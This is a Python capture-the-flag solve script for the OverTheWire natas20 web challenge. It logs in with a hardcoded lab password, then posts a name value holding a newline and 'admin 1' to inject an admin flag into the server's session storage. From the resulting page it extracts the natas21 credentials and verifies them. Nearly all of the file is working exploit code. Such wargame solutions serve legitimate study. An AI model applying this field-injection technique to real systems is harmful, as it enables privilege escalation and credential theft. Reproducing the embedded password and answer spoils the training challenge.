import requests
from requests.auth import HTTPBasicAuth
import re

login_url = "http://natas20.natas.labs.overthewire.org/"
main_url = "http://natas20.natas.labs.overthewire.org/index.php"

user =  "natas20"
passwd = "guVaZ3ET35LbgbFMoaN5tFcYT1jEP7UH"

print("\nMade by: DPZM")
print("\n" + "*" * 80 + "\n")
print("""  $$\   $$\  $$$$$$\ $$$$$$$$\  $$$$$$\   $$$$$$\         $$$$$$\   $$$$$$\  
  $$$\  $$ |$$  __$$\\__$$  __|$$  __$$\ $$  __$$\       $$  __$$\ $$$ __$$\ 
  $$$$\ $$ |$$ /  $$ |  $$ |   $$ /  $$ |$$ /  \__|      \__/  $$ |$$$$\ $$ |
  $$ $$\$$ |$$$$$$$$ |  $$ |   $$$$$$$$ |\$$$$$$\         $$$$$$  |$$\$$\$$ |
  $$ \$$$$ |$$  __$$ |  $$ |   $$  __$$ | \____$$\       $$  ____/ $$ \$$$$ |
  $$ |\$$$ |$$ |  $$ |  $$ |   $$ |  $$ |$$\   $$ |      $$ |      $$ |\$$$ |
  $$ | \$$ |$$ |  $$ |  $$ |   $$ |  $$ |\$$$$$$  |      $$$$$$$$\ \$$$$$$  /
  \__|  \__|\__|  \__|  \__|   \__|  \__| \______/       \________| \______/""")
print("\n" + "*" * 80)

print("\n [!] Vulnerability found: Cross Site Session Hijacking")

with requests.Session() as session:
    session.auth = HTTPBasicAuth(user, passwd)

    # 1 - Craft malicious payload with admin cookie
    url = main_url
    print("\n" + "=" * 100 + "\n [+] Requesting %s - Creating Session File" % url + "\n" + "=" * 100)
    payload = {"name":"hsmxmx \nadmin 1"}
    print("\n Payload generated: %s" % str(payload))
    print("\n > Sending payload...")
    r = session.post(main_url, data=payload)
    if r.status_code == 200:
        print("\n Session file created successfully!")
        
        # 2 - Request result
        url = main_url + "?debug=test&name=hsmxmx"
        print("\n" + "=" * 120 + "\n [+] Requesting %s - Password compromised " % url + "\n" + "=" * 120)
        
        r = session.get(url)
        
        # Find user
        username = re.search('([u|U]ser.*)', r.text).group(0)
        username = username.split()[1]
        print("\nUsername: %s" % username)
        
        # Find password
        password = re.findall('([p|P]ass.*[^\W]{4})', r.text)
        password = password[1].split()[1]
        print("\nPassword: %s" % password)
        

        print("\n" + "=" * 40 + "\n[*] Testing credentials for next level..." + "\n" + "=" * 40)
        new_level_url = "http://natas21.natas.labs.overthewire.org/"
        session.auth = HTTPBasicAuth(username, password)
        r = session.get(new_level_url)
    
        if r.status_code == 200:
            print("\n Login successful!")
            print("\n > New level (21): %s \n" % new_level_url)
        else:
            print("\n Wrong credentials!\n")
    
    else:
        print("\n Something went wrong...\n")